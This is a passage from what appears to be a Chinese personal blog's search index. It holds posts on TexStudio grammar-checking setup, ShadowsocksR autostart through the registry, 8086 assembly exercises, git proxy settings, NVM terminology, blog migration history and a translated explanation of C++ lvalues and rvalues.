title="http://localhost:8081/v2/check?language=en&amp;text=you+is+girl">http://localhost:8081/v2/check?language=en&amp;text=you+is+girl<i class="fa fa-external-link"></i></span> ,得到json说明配置成功。</p><p><img data-src="https://pic.superbed.cn/item/5e159f8576085c32896adce0.jpg"></p><h2 id="3-TexStudio配置"><a href="#3-TexStudio配置" class="headerlink" title="3. TexStudio配置"></a>3. TexStudio配置</h2><p>打开TexStudio，选项-&gt;语言检查,</p><p>然后选择导入路径，选择之前下载的后缀为oxt的文件，如图</p><p><img data-src="https://pic.superbed.cn/item/5e15a00376085c32896ae841.jpg"></p><p>然后一路确定就行。</p><p>之后如图配置：</p><p><img data-src="C:\Users\a2855\AppData\Roaming\Typora\typora-user-images\1578475684632.png" alt="1578475684632"></p><ul><li>服务器URL：<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4MDgxLw==" title="http://localhost:8081/">http://localhost:8081<i class="fa fa-external-link"></i></span></li><li>Java，输入java就好，网上很多说要输入全路径的，其实没必要。</li><li>LT路径就是你下载的LT jar包路径</li><li>LT参数保持默认就好</li></ul><p>然后重启TexStudio.</p><p>进行下图操作检查是否配置成功。</p><p><img data-src="https://pic.superbed.cn/item/5e15a0f876085c32896afdd8.jpg"></p><p><img data-src="https://pic.superbed.cn/item/5e15a12776085c32896b0338.jpg"></p><p>或者看TexStudio右下角有个LT的图标。</p><p><img data-src="https://pic.superbed.cn/item/5e15a14776085c32896b06c0.jpg"></p><h2 id="4-检查效果"><a href="#4-检查效果" class="headerlink" title="4. 检查效果"></a>4. 检查效果</h2><p>如果成功走到这里那就是配置成功了，现在来检验下效果。</p><p><img data-src="https://pic.superbed.cn/item/5e15a1e676085c32896b23e9.jpg"></p><p>输入 You is a smart guy. 显然is应该改为are或者were。对于错误的语法，texstudio会自动标出颜色，然后点击在由underline的地方右键就可以修改了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmJzbWF4LmNvbS9BL0Q4NTRrWVJRSkUv" title="https://www.bbsmax.com/A/D854kYRQJE/">Installing Language Tool in TexStudio<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Latex </tag>
            
            <tag> TexStudio </tag>
            
            <tag> Language Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSR无法开机自启问题解决</title>
      <link href="/archives/8b596c8a.html"/>
      <url>/archives/8b596c8a.html</url>
      
        <content type="html"><![CDATA[<p>最近事情实在是太多了。一个多月没写点什么东西，等到熬过期末，就可以有点自己的时间啦！</p><p>不知道给电脑设置了什么东西，SSR不开机自启动了，去选项中勾选会提示 <strong>无法修改注册表</strong>的提示，最开始以为是没给管理员权限，但是给了管理员权限也没用。查了很久的资料，最后发现手动添加进开机自动启就OK啦（真实惭愧，用了这么多年Windows，居然怎么手动添加开机自启动都不知道）。</p><a id="more"></a><p>手动开启的方法有两种：</p><ol><li>将应用的快捷键直接拖入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp目录下，这样的确会在任务管理器-&gt;启动栏下看到ssr的启动项，但是经过我实验，重启后ssr依然不会自启动。</li><li>手动修改注册表，这种方法略微麻烦，但是确实有效，所以在这里就介绍这种方法：</li></ol><p>按下Win+R，输入 regedit ，然后进入 HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run 目录，在空白区点击右键，新建-&gt;字符串值(S)，输入一个名字，这里就取ShadowsocksR吧。然后点击刚才新建的项，右键修改， 在“数据数值”文本框中输入SSR应用程序的绝对路径 。如下图：</p><p><img data-src="https://pic3.superbed.cn/item/5df4b29aa4fbc8614a513fb1.png"></p><p>现在就OK了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《汇编语言》王爽-作业记录-第5章</title>
      <link href="/archives/34a9b87f.html"/>
      <url>/archives/34a9b87f.html</url>
      
        <content type="html"><![CDATA[<p>第五章–[BX]和loop指令。</p><p>作业1&amp;2: 编程，向内存0:200~0:23F依次传送数据0~63(3FH)。要求只能使用9条指令（含mov ax,4c00h和int 21h)。<br>分析：</p><a id="more"></a><ul><li>首先确定数据段(ds)为0,偏移量为200</li><li>题目要求的是一段连续地址，存储一段连续数字，且两者一一对应，所以用一个变量来代替就好了，自然而然的想到用bx寄存器。但在赋值的时候应该要注意一个点：赋值分为“字节”赋值和“字”赋值。也就是对应着的长度不一样，因为我们这里是对内存单元即一个字节赋值，所以应该只使用到bx的低8位，<strong>而bx的低8位刚好是从零开始的</strong>，所以再次确定可以使用bx寄存器（这里可以想一下如果要求向0:210~0:24F区间赋值，你还可以使用bx寄存器吗？）</li><li>赋值操作执行64次，cx寄存器应该赋值为多少？<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax;设置数据段</span><br><span class="line">mov bx,200H;设置基础偏移</span><br><span class="line">mov cx,40H  ;设置循环条件，因为break loop的条件是cx&#x3D;&#x3D;0，所以设置40H而不是3FH</span><br><span class="line"></span><br><span class="line">s:</span><br><span class="line">mov [bx],bl</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>OK，查看下效果：<br><img data-src="https://pic.superbed.cn/item/5dc7f6168e0e2e3ee9032081.jpg"></li></ul><p>作业3：下面程序的功能是将 “mov ax,4c00h”之前的指令复制到内存0：200处，请补全程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,?? ;!!!!!</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,??;!!!!!</span><br><span class="line"></span><br><span class="line">s: </span><br><span class="line">mov al,[bx]</span><br><span class="line">mov es:[bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><strong>2019/11/10</strong> 目前学到这里，第二空暂时不知道正确答案，但是经过资料搜索，大体知道可以怎么编写程序，但需要修改源程序。所以这里留个坑，如果之后学到的知识可以填补，再来补吧。<br>第一个空显然应该填cs,因为cs指向我们的代码段的第一条指令。<br>重点放到第二个空，参考自：<span class="exturl" data-url="aHR0cHM6Ly96aGlkYW8uYmFpZHUuY29tL3F1ZXN0aW9uLzYyNDU2NTM0Lmh0bWw=" title="https://zhidao.baidu.com/question/62456534.html">https://zhidao.baidu.com/question/62456534.html<i class="fa fa-external-link"></i></span><br>对于任意一个汇编程序，cx存放的是总的指令长度（我一直在想，如果总指令长度超过FFFF了怎么办？），那么cx减去    <code>mov ax,4c00h和 int 21h</code>长度即可。<br><img data-src="https://pic.superbed.cn/item/5dc7faf68e0e2e3ee90451d8.jpg"><br>通过<code>u</code>指令查看，cx的确存放的是一个汇编的总指令长度，而<code>mov ax,4c00h和 int 21h</code>共占用5字节，所以可将程序修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,cs ;!!!!!</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,0</span><br><span class="line">;mov cx,??;!!!!! 注意这里不是标准答案，因为修改了源程序</span><br><span class="line">sub cx,5</span><br><span class="line"></span><br><span class="line">s: </span><br><span class="line">mov al,[bx]</span><br><span class="line">mov es:[bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>结果：<br><img data-src="https://pic.superbed.cn/item/5dc7f95d8e0e2e3ee9040288.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加快git clone的速度</title>
      <link href="/archives/fd5e897c.html"/>
      <url>/archives/fd5e897c.html</url>
      
        <content type="html"><![CDATA[<p>作为全球最大的同性交友网站，github几乎是每个程序员天天打交道的地方。clone别人开源的代码仓库是再正常不过的事情。然而github服务器毕竟在国外，这就造成了我们clone的速度非常慢，从几K到几时K不等。所以有必要说一下如何提速。</p><a id="more"></a><h2 id="1-设置"><a href="#1-设置" class="headerlink" title="1. 设置"></a>1. 设置</h2><p>既然服务器在国外，首先想到的当然是挂代理啦。所以，请确保你有一个ss/ssr账号。</p><p>然后打开cmd窗口,输入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>注意末尾是1080端口，这是默认ss所会占用的端口，但是如果你非常幸运不是默认的端口，怎么去查看shaowsocksR所占用的端口呢。</p><ol><li><p>找到ssr的pid</p><p>打开cmd，输入<code>tasklist</code>，找到shadowsocksR，旁边那个数字就是pid了。</p><p><img data-src="https://pic.superbed.cn/item/5dbaa12abd461d945a7d03a3.jpg"></p></li><li><p>得到所占用的端口，输入<code>netstat -ano | findstr &quot;pid&quot;</code>，这里的pid替换为你在第一步中得到的pid号，如我这里就是11916，然后就可以得到端口了。</p><p><img data-src="https://pic.superbed.cn/item/5dbaa188bd461d945a7d07f0.jpg"></p></li></ol><p>最后把命令行中的端口改为对应的端口号就行了。</p><h2 id="2-检验"><a href="#2-检验" class="headerlink" title="2. 检验"></a>2. 检验</h2><p>看你设置是否成功，首先进入用户目录下,C:\User\用户名，然后打开.gitconfig文件，看是否是下面这个样子：</p><p><img data-src="https://pic.superbed.cn/item/5dbaa207bd461d945a7d0ca0.jpg"></p><p>如果有http，https对应的项，那就是设置成功了。现在来clone一个仓库试试：</p><p><img data-src="https://pic.superbed.cn/item/5dbaa25dbd461d945a7d10a1.jpg"></p><p>可以看到速度基本可以达到MB级别以上。</p><p>ok，good luck。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git clone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是PM，什么是SCM，和NVM什么关系？</title>
      <link href="/archives/af097aa9.html"/>
      <url>/archives/af097aa9.html</url>
      
        <content type="html"><![CDATA[<p>转载自：<span class="exturl" data-url="aHR0cDovL2Jsb2cuamNpeC50b3AvMjAxOS0wMi0xOC9wbS1udm0vI05WTVBNX1NDTQ==" title="http://blog.jcix.top/2019-02-18/pm-nvm/#NVMPM_SCM">http://blog.jcix.top/2019-02-18/pm-nvm/#NVMPM_SCM<i class="fa fa-external-link"></i></span></p><p>近几年，不论在学术界还是工业界，NVM 都是比较前沿的技术。其实 NVM 一词并不新，是因为 PM(或称 SCM)这个与 NVM 有关的概念的出现，使得 NVM 这词又 “火” 了一把。在近年的相关文献中，NVM 也经常被和 PM(SCM)混用，让人搞不清。本文捋一捋它们之间的关系。</p><a id="more"></a><h2 id="NVM"><a href="#NVM" class="headerlink" title="NVM"></a>NVM</h2><p>准确来说，NVM (non-volatile memory) 指的是非易失的物理存储介质，比如 NAND flash、PCM、3D XPoint 等都算是 NVM，这些 NVM 可以做成 SSD 形式，也可以做成 PM (或称 SCM)。</p><pre><code>           NVM存储介质               |               V           NAND Flash   ---+                           |    +--     PCM         ---+--&gt; SSD +--+                      | |  +--    3D XPoint    ---+ V PM (SCM)</code></pre><h2 id="NVM-与-SSD-的关系"><a href="#NVM-与-SSD-的关系" class="headerlink" title="NVM 与 SSD 的关系"></a>NVM 与 SSD 的关系</h2><p>我们常见的 SSD，不管是 SATA 接口还是 PCIe 接口，基本都是基于 NAND Flash 的；当然也有例外，Intel 两年前推出的 Optane SSD 就基于 3D XPoint 而非 NAND Flash。不管底层介质是 Flash 还是 3D XPoint，这些介质广义上都是属于 NVM 的。它们都是存储设备，是块设备，是 IO 设备，除了性能，用户软件都可以将它们无差别地看成 SSD。</p><h2 id="NVM-与-PM-SCM-的关系"><a href="#NVM-与-PM-SCM-的关系" class="headerlink" title="NVM 与 PM (SCM) 的关系"></a>NVM 与 PM (SCM) 的关系</h2><p>现在，PCM、3D XPoint 等新型的 NVM 也被用于制作 DIMM 接口的内存条，被称为 PM 或 SCM。</p><p>其实 PM (persistent memory) 或者 SCM (storage class memory)基本为同义词，指的是内存 DIMM 接口的、可字节寻址的 NVM 设备。新型的 NVM 存储介质相对 NAND Flash 更容易做到细粒度读写，更适合做成可字节寻址 (byte-addressable) 的内存形式。并且，因为密度更大，基于新型 NVM 介质的 PM 可以做到 DRAM 内存条容量几倍；也由于新型 NVM 介质还不及 DRAM 的性能，PM 的读写速度可能比 DRAM 内存条慢几倍。</p><h2 id="NVDIMM-又是什么？"><a href="#NVDIMM-又是什么？" class="headerlink" title="NVDIMM 又是什么？"></a>NVDIMM 又是什么？</h2><p>“非易失内存条”其实并非近几年才出现，很久之前就有基于 NAND Flash 的非易失型内存条 (一般被称为 NVDIMM)，不过这种 NVDIMM 通常被做成“电池 + Flash+DRAM” 的形式：通电时，依然是依靠 DRAM 工作，断电时才用电池电量将 DRAM 数据刷回 Flash。Flash 无法直接代替 DRAM 是是因为 Flash 的读写粒度不一致，且存在写前擦除、拷贝等要求，不利于直接进行细粒度存取。这种设计就导致 NVDIMM 只可能比一般 DRAM 内存条更贵，且不可能做的比 DRAM 内存有更大容量密度。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然容易有歧义，但近年依然有很多文献称基于 PM 或 SCM 为 NVM。因此阅读文献时我们可以认为：狭义上，NVM 可以指 Flash、PCM 等存储介质；广义上，NVM 也可以指 SCM、PM 等存储设备，其实早年间，也有称 SSD 为 NVM 的。</p>]]></content>
      
      
      <categories>
          
          <category> 存储 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PM </tag>
            
            <tag> SCM </tag>
            
            <tag> NVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客迁移记录</title>
      <link href="/archives/e4354471.html"/>
      <url>/archives/e4354471.html</url>
      
        <content type="html"><![CDATA[<p>时隔半年，又迁移博客了。上个博客Typecho应该是我最满意的博客系统了，无奈，因为种种问题，需要关闭服务器了，想过回到简书、csdn、掘金等地方。但是思忖再三，还是算了吧。最终回到了Hexo下。</p><p>个人博客迁移经历：</p><p>简书-&gt;CSDN-&gt;Hexo-&gt;Wordpress-&gt;typecho-&gt;掘金-&gt;Hexo</p><p>略微评价：</p><ul><li><p>简书：水文，广告文太多，动不动锁文章</p></li><li><p>CSDN：广告太多，排版丑陋，系统bug</p></li><li><p>Wordpress：反应缓慢，需要服务器</p></li><li><p>Typecho：反应很快，需要服务器，个人最推荐</p></li><li><p>掘金：做IT写博客还不错，不亚于简书的颜值，但是发文必须设定“标签”的机制太过艹了。</p></li><li><p>Hugo：花了半天，一直没能在我的电脑上搭起来，据说速度快，搭建简单。</p></li><li><p>Hexo：编译略慢，将就能用，主题较多，较成熟。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>理解C++中的左值(lvalue)和右值(rvalue)</title>
      <link href="/archives/c49b3e12.html"/>
      <url>/archives/c49b3e12.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 翻译自:<span class="exturl" data-url="aHR0cHM6Ly93d3cuaW50ZXJuYWxwb2ludGVycy5jb20vcG9zdC91bmRlcnN0YW5kaW5nLW1lYW5pbmctbHZhbHVlcy1hbmQtcnZhbHVlcy1j" title="https://www.internalpointers.com/post/understanding-meaning-lvalues-and-rvalues-c">https://www.internalpointers.com/post/understanding-meaning-lvalues-and-rvalues-c<i class="fa fa-external-link"></i></span></p><p>我一直苦于理解C++中的左值和右值。现在我感觉是时候分享出我对它们的理解了，因为它们在C++语言发展中扮演者越来越重要的角色。</p><p>一旦你理解了lvalues和rvalues的含义，你就可以更深入地研究高级c++特性，比如move语义和右值引用。</p><a id="more"></a><h2 id="1-Lvalues-and-rvalues-a-friendly-definition"><a href="#1-Lvalues-and-rvalues-a-friendly-definition" class="headerlink" title="1.Lvalues and rvalues: a friendly definition"></a>1.Lvalues and rvalues: a friendly definition</h2><p>在C++中，<strong>一个lvalue指的就是一个特定的内存位置</strong>，<strong>而rvalue则不指向任意位置</strong>。通常，rvlaue是一种临时的变量却其生命周期较短，而lvalue则相反，lvalue具有更长的生命周期，因为它们以内存空间的变量的形式存在。你也可以把lvalue理解成容器，rvalue理解成容器中包含的东西，如果没有容器，rvalue很快就dead了。</p><p>现在来举点例子吧：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">666</span>;   <span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>这里<strong>666是一个rvalue;</strong> 数字(字面常量)没有特定的内存地址，它们仅仅在程序运行时使用了一些临时寄存器。这个数字被赋值给x, x是一个变量。<strong>变量</strong>有一个特定的内存位置，所以它<strong>是一个lvalue</strong>。c++声明一个赋值需要一个lvalue作为其左操作数。</p><p>x是一个lvalue，现在你可以这样做：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* y = &amp;x;   <span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>这里我获取了x的内存地址，并通过地址操作符&amp;将其放入y中。地址操作符&amp;接受一个lvalue参数并生成一个rvalue。而y则是一个指针型变量（占用内存空间），所以y是一个右值。</p><p>但是，我们不能像这样做：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="number">666</span> = y; <span class="comment">// error!</span></span><br></pre></td></tr></table></figure><p>这当然是显然的啦。源于在于666只是一个字面常量–所以它是一个rvalue，没有一个特定的内存空间。既然没有内存空间，那我们把y的值赋值到哪儿呢？当然也就不行咯。</p><p>如果我们运行上述代码，gcc将提示我们下面的错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: lvalue required as left operand of assignment</span><br></pre></td></tr></table></figure><p>He is damn right.(我不知道怎么翻译，才有这种感觉，哈哈哈<del>~</del>)；左侧赋值语句必须要一个lvalue才行，但是在这里我使用了一个rvalue 666.</p><p>我也可以这样做。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *y  = &amp;<span class="number">666</span>;</span><br></pre></td></tr></table></figure><p>GCC 报错：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: lvalue required as unary <span class="string">&#x27;&amp;&#x27;</span> operand</span><br></pre></td></tr></table></figure><p>He is right agan. “&amp;”操作符需要一个lvalue作为输入，因为&amp;只能处理具有内存地址的量。</p><h2 id="2-Functions-returning-lvalues-and-rvalues"><a href="#2-Functions-returning-lvalues-and-rvalues" class="headerlink" title="2. Functions returning lvalues and rvalues"></a>2. Functions returning lvalues and rvalues</h2><p>我们都知道左赋值语句必须要一个lvalue。所以，如果像下面这个函数写，一定会报错：<code>lvalue required as left operand of assignment</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setValue</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... somewhere in main() ...</span></span><br><span class="line"></span><br><span class="line">setValue() = <span class="number">3</span>; <span class="comment">// error!</span></span><br></pre></td></tr></table></figure><p>setValue() 返回了一个rvalue(临时数字6)，它不能用于左赋值语句。那么如果我们的函数返回一个lvalue呢？如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">setGlobal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> global;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... somewhere in main() ...</span></span><br><span class="line"></span><br><span class="line">setGlobal() = <span class="number">400</span>; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>这样就能正常工作了，因为setGlobal()返回了一个引用。引用就是指向内存空间（这里是global）的东西，所以引用能够作为lvalue，当然也就能用于赋值。</p><p>i&gt; 没有引用符&amp;，上述代码是不行的。这也是为什么C++的左值右值理解要比C语言难的原因之一。你永远不会在C语言中看到函数调用写在等号左边吧。</p><h2 id="3-Lvalue-to-rvalue-conversion"><a href="#3-Lvalue-to-rvalue-conversion" class="headerlink" title="3. Lvalue to rvalue conversion"></a>3. Lvalue to rvalue conversion</h2><p>有事，lvalue是可以转换为rvalue的。我们以“+”来距离。“+”以两个rvalue作为参数，并返回一个rvalue。</p><p>如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> z = x + y; <span class="comment">//ok</span></span><br></pre></td></tr></table></figure><p>等下，这里的x和y是lvalue啊，但是”+”需要的是两个rvalue作为参数。答案很简单，x和y都被隐式的转换为了rvalue。还有很多其它的操作符也有类似的转换– “-“,”*”,”/“等。</p><h2 id="4-Lvalue-references"><a href="#4-Lvalue-references" class="headerlink" title="4. Lvalue references"></a>4. Lvalue references</h2><p>既然lvalue可以转化为rvalue，但rvalue可以转化为lvalue吗？Nope。</p><p>在C++，你可以这样做：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> y = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; yref = y;</span><br><span class="line">yref++;        <span class="comment">// y is now 11</span></span><br></pre></td></tr></table></figure><p>你声明了一个引用yref，并指向了y，yref是一个lvalue。我们都知道一个引用必须指向一个有内存空间的变量，也即lvalue。这里y的确是有内存空间的变量，所以上述代码没有问题。</p><p>现在，我们考虑直接将一个字面常量10直接赋值给我们的引用呢？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp;yref = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>在等号的右边，我们有一个rvalue，rvalue是没有内存空间的，他只是一种临时变量。而yref必须指向具有内存空间的变量，这就产生了冲突。</p><p>也许你会这样想，为了使用引用，一个易失的字面常量（rvalue）可以自动转化为lvalue才对。如果语言允许这样做，那之后你就可以通过引用来改变一个rvalue。但是rvalue是临时的，是易失的，那一旦rvalue消失了，引用又指到哪儿呢？</p><p>下面的代码会因为相同的原因而无法编译通过：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnc</span><span class="params">(<span class="keyword">int</span>&amp; x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fnc(<span class="number">10</span>);  <span class="comment">// Nope!</span></span><br><span class="line">    <span class="comment">// This works instead:</span></span><br><span class="line">    <span class="comment">// int x = 10;</span></span><br><span class="line">    <span class="comment">// fnc(x);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将一个临时rvalue 10 传递给一个函数，这个函数使用了引用作为形参。<strong>rvalue是没法自动转化为lvalue的。</strong>注释的代码是可以通过的，因为已经在10赋值给了一个lvalue x。</p><h2 id="5-Const-lvalue-reference-to-the-rescue"><a href="#5-Const-lvalue-reference-to-the-rescue" class="headerlink" title="5. Const lvalue reference to the rescue"></a>5. Const lvalue reference to the rescue</h2><p>上面的代码片段在编译时，会报如下错误：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: invalid initialization of non-const reference of type &#x27;int&amp;&#x27; from an rvalue of type &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>GCC指出这个常量不是一个const。难道将因为增添const修饰就可以通过了？的确是这样。根据C++语言规范，你的确可以将一个const lvalue绑定到一个rvalue上。所以下面这两段代码可以通过：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;ref = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fnc(<span class="number">10</span>);  <span class="comment">// OK!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这背后的思想相当直接。字面常量10是易失的，所以使用可修改值的引用是没有意义的。但是当引用无法修改rvalue的value，那就可以了。所以增添了const修饰的引用是可以指向一个rvalue的。但其实也不算真正的指向了一个rvalue，只是我们可以这样使用。主要的原因是编译器帮我们创建了隐式的lvalue变量。如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the following...</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... would translate to:</span></span><br><span class="line"><span class="keyword">int</span> __internal_unique_name = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref = __internal_unique_name;</span><br></pre></td></tr></table></figure><p>现在你可以正常的使用引用了。当然了，这种情况下你是没办法通过引用更改指向的值的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 